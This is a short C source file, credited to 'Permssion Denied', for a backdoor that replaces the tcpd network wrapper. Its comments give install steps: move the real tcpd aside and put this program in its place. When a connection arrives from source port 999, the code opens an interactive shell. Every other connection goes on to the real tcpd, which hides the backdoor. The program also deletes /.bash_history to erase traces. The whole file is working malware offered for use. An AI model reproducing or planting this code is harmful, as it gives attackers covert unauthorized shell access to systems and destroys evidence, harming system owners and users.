// tcpdback.c - by Permssion Denied
// hard to find backdoor with acces control
// you must copy old tcpd to in.tcpd and replace it with this program

#include <stdio.h>
#include <netinet/in.h>
#include <sys/socket.h>
#include <netdb.h>
#include <errno.h>

#define EVIL_PORT 999
#define OLD_TCPD "/usr/sbin/in.tcpd"

main (int argc, char **argv)
{
 struct sockaddr_in sind;
 int size;
  
 remove("/.bash_history");
 size = sizeof(sind);
 if(getpeername(fileno(stdin), (struct sockaddr *) &sind, &size) != 0)
  execv(OLD_TCPD, argv);
 if(sind.sin_port == ntohs(EVIL_PORT)) {
  execl("/bin/sh", "/bin/sh", "-i", NULL);
  return;
 }
 execv(OLD_TCPD, argv);
}